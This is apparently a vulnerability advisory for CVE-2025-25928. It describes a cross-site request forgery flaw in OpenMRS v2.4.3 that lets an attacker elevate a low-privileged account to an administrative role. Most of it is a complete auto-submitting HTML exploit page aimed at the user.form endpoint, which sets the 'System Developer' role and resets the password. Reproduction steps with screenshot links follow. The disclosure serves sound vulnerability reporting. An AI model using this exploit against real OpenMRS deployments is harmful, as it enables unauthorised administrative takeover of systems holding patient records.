# CVE-2025-25928

---

## CSRF PrivEsc


OpenMRS v2.4.3 Build 0ff0ed allows attackers to to execute arbitrary operations via a crafted CSRF PoC. In this case, an attacker could elevate a low-privileged account to an administrative role by leveraging the CSRF vulnerability at the /openmrs/admin/users/user.form endpoint


* Vulnerable Endpoint: /openmrs/admin/users/user.form endpoint
* CSRF PoC:

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="http://localhost:8080/openmrs/admin/users/user.form" method="POST">
      <input type="hidden" name="userId" value="11" />
      <input type="hidden" name="person&#95;id" value="12" />
      <input type="hidden" name="person&#46;names&#91;0&#93;&#46;givenName" value="lowPriv" />
      <input type="hidden" name="person&#46;names&#91;0&#93;&#46;middleName" value="" />
      <input type="hidden" name="person&#46;names&#91;0&#93;&#46;familyName" value="" />
      <input type="hidden" name="person&#46;gender" value="M" />
      <input type="hidden" name="username" value="lowPriv" />
      <input type="hidden" name="userFormPassword" value="Test123&#33;" />
      <input type="hidden" name="confirm" value="Test123&#33;" />
      <input type="hidden" name="roleStrings" value="System&#32;Developer" />
      <input type="hidden" name="secretQuestion" value="" />
      <input type="hidden" name="secretAnswer" value="" />
      <input type="hidden" name="property" value="loginAttempts" />
      <input type="hidden" name="value" value="0" />
      <input type="hidden" name="property" value="lockoutTimestamp" />
      <input type="hidden" name="value" value="" />
      <input type="hidden" name="action" value="Save&#32;User" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

---

### Steps to reproduce:

1.) Observe the user lowPriv has the role anonymous:

 ![image](https://github.com/user-attachments/assets/4fa4922e-ee24-44dd-9808-44566bc346c9)

lowPriv user:

![image](https://github.com/user-attachments/assets/62aa5116-879f-4cf5-9a11-377bbc0eff71)


2.) Execute the following CSRF PoC within the Admin users browser, and observe the lowPriv user is now an Admin.

![image](https://github.com/user-attachments/assets/ef2d4cdf-2469-43ab-aa54-11e09dbf942f)

lowPriv user accessing Admin:

 ![image](https://github.com/user-attachments/assets/73369363-6370-4914-a4cf-b9f9c5d0a5ce)


NOTE: sign in / out of the application as the LowPriv user for the changes to take affect 




